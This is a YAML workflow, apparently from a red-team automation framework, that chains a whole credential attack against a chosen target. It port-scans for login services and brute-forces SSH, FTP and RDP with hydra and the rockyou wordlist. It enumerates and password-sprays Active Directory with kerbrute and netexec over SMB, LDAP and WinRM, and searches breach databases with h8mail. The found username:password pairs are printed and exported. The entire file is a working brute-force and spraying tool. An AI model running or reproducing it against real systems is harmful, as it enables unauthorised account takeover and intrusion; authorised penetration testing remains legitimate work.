name: credential-hunt
description: 'Multi-protocol credential hunting — brute-force login services with hydra, spray AD with netexec/kerbrute, search breach databases, and identify/crack password hashes.

  '
tags:
- redteam
- brute
- credentials
- hydra
- spray
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target IP or hostname
      alias: t
    users_file:
      required: true
      type: string
      description: Path to username list
    passwords_file:
      type: string
      default: /usr/share/wordlists/rockyou.txt
      description: Path to password list
    domain:
      type: string
      default: ''
      description: AD domain name (for Kerberos/SMB spray)
    protocols:
      type: string
      default: ssh,ftp,smb
      description: Comma-separated protocols for hydra (ssh,ftp,smb,rdp,http-post-form)
jobs:
  service-probe:
    name: Service Detection
    outputs:
      found_services: '{{ steps.detect-services.outputs.found_services }}'
      service_count: '{{ steps.detect-services.outputs.service_count }}'
    steps:
    - task: naabu
      name: port-scan
      with:
        target: '{{ inputs.target }}'
        top_ports: '1000'
        rate: 1000
      continue-on-error: true
    - task: httpx
      name: http-probe
      with:
        target: '{{ inputs.target }}'
        status_code: true
        title: true
      continue-on-error: true
    - name: detect-services
      script: |
        ports_data = {{ ports(steps[0].outputs.typed_outputs) | tojson }}
        service_map = {
            22: 'ssh', 21: 'ftp', 445: 'smb', 3389: 'rdp',
            3306: 'mysql', 5432: 'postgres', 1433: 'mssql',
            1521: 'oracle', 6379: 'redis', 27017: 'mongodb',
            5900: 'vnc', 8080: 'http', 443: 'https', 80: 'http'
        }

        found_services = set()
        for p in ports_data:
            port = p.get('port')
            if port in service_map:
                found_services.add(service_map[port])

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"found_services={','.join(sorted(found_services))}\n")
            f.write(f"service_count={len(found_services)}\n")

        print(f"Login services detected: {', '.join(sorted(found_services))}")
  brute-force:
    name: Hydra Brute-Force
    outputs:
      brute_hits: '{{ steps.collect-creds.outputs.brute_hits }}'
      cred: '{{ steps.collect-creds.outputs.cred }}'
    needs:
    - service-probe
    steps:
    - task: hydra
      name: hydra-ssh
      with:
        target: '{{ inputs.target }}'
        login_file: '{{ inputs.users_file }}'
        password_file: '{{ inputs.passwords_file }}'
        service: ssh
        threads: 8
      continue-on-error: true
    - task: hydra
      name: hydra-ftp
      with:
        target: '{{ inputs.target }}'
        login_file: '{{ inputs.users_file }}'
        password_file: '{{ inputs.passwords_file }}'
        service: ftp
        threads: 8
      continue-on-error: true
    - task: hydra
      name: hydra-rdp
      with:
        target: '{{ inputs.target }}'
        login_file: '{{ inputs.users_file }}'
        password_file: '{{ inputs.passwords_file }}'
        service: rdp
        threads: 4
      continue-on-error: true
    - name: collect-creds
      script: |
        creds = []
        for idx in range(3):
            step_data = {{ steps | tojson }}
            typed = step_data[idx].get('outputs', {}).get('typed_outputs', [])
            for item in typed:
                if item.get('_type') == 'user_account':
                    creds.append(item)

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"brute_hits={len(creds)}\n")
            for c in creds:
                f.write(f"cred={c.get('username','')}:{c.get('password','')}\n")

        print(f"Hydra found {len(creds)} valid credentials")
        for c in creds:
            print(f"  [+] {c.get('username')}:{c.get('password')}")
  ad-spray:
    name: AD Credential Spray
    outputs:
      ad_spray_hits: '{{ steps.collect-ad-creds.outputs.ad_spray_hits }}'
    needs:
    - service-probe
    if: '{{ inputs.domain }}'
    steps:
    - task: kerbrute
      name: kerbrute-enum
      with:
        target: '{{ inputs.target }}'
        mode: userenum
        dc: '{{ inputs.target }}'
        domain: '{{ inputs.domain }}'
        users: '{{ inputs.users_file }}'
      continue-on-error: true
    - task: netexec
      name: nxc-smb-spray
      with:
        target: '{{ inputs.target }}'
        protocol: smb
        username: '{{ inputs.users_file }}'
        password: '{{ inputs.passwords_file }}'
        domain: '{{ inputs.domain }}'
      continue-on-error: true
    - task: netexec
      name: nxc-ldap-spray
      with:
        target: '{{ inputs.target }}'
        protocol: ldap
        username: '{{ inputs.users_file }}'
        password: '{{ inputs.passwords_file }}'
        domain: '{{ inputs.domain }}'
      continue-on-error: true
    - task: netexec
      name: nxc-winrm-spray
      with:
        target: '{{ inputs.target }}'
        protocol: winrm
        username: '{{ inputs.users_file }}'
        password: '{{ inputs.passwords_file }}'
        domain: '{{ inputs.domain }}'
      continue-on-error: true
    - name: collect-ad-creds
      script: |
        all_creds = set()
        for idx in range(4):
            step_data = {{ steps | tojson }}
            typed = step_data[idx].get('outputs', {}).get('typed_outputs', [])
            for item in typed:
                u = item.get('username', '')
                p = item.get('password', '')
                if u:
                    all_creds.add(f"{u}:{p}")

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"ad_spray_hits={len(all_creds)}\n")

        print(f"AD spray found {len(all_creds)} valid credentials")
  breach-search:
    name: Breach Database Search
    outputs:
      breach_count: '{{ steps.collect-breaches.outputs.breach_count }}'
    steps:
    - task: h8mail
      name: h8mail-search
      with:
        target: '{{ inputs.users_file }}'
      continue-on-error: true
    - name: collect-breaches
      script: |
        breach_creds = {{ users(steps[0].outputs.typed_outputs) | tojson }}

        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
            f.write(f"breach_count={len(breach_creds)}\n")

        print(f"Breach database hits: {len(breach_creds)}")
  summary:
    name: Credential Hunt Summary
    needs:
    - brute-force
    - ad-spray
    - breach-search
    steps:
    - name: report
      run: |
        echo "======================================================"
        echo " CREDENTIAL HUNT COMPLETE: {{ inputs.target }}"
        echo "======================================================"
        echo ""
        echo "--- Services Detected ---"
        echo "Login services: {{ jobs['service-probe'].outputs.found_services }}"
        echo ""
        echo "--- Hydra Brute-Force ---"
        echo "Valid credentials: {{ jobs['brute-force'].outputs.brute_hits }}"
        echo ""
        echo "--- AD Spray ---"
        echo "AD spray hits: {{ jobs['ad-spray'].outputs.ad_spray_hits | default('N/A (no domain)', true) }}"
        echo ""
        echo "--- Breach Search ---"
        echo "Breach hits: {{ jobs['breach-search'].outputs.breach_count }}"
      log-stdout: true
    - name: export-to-project
      script: |
        import shutil
        from pathlib import Path

        project = '{{ vars.project_path | default("", true) }}'
        if not project:
            print('No --project set, skipping file export')
        else:

            # login services
            d = '{{ vars.project_hosts }}'
            Path(d).mkdir(parents=True, exist_ok=True)
            data = '''{{ jobs['service-probe'].outputs.found_services | default('', true) }}'''.strip()
            if data:
                (Path(d) / 'found-services.txt').write_text(data)
                print(f'  [+] hosts/found-services.txt ({len(data.splitlines())} lines)')

            # Auto-export typed outputs
            all_typed = []
            for typed in [
                {{ jobs['service-probe'].outputs.typed_outputs | default([], true) | tojson }},
                {{ jobs['brute-force'].outputs.typed_outputs | default([], true) | tojson }},
                {{ jobs['ad-spray'].outputs.typed_outputs | default([], true) | tojson }},
                {{ jobs['breach-search'].outputs.typed_outputs | default([], true) | tojson }},
            ]:
                all_typed.extend(typed)
            summaries = export_typed_outputs(project, all_typed)
            for s in summaries:
                print(s)

            print(f'Project export complete: {project}')
      continue-on-error: true
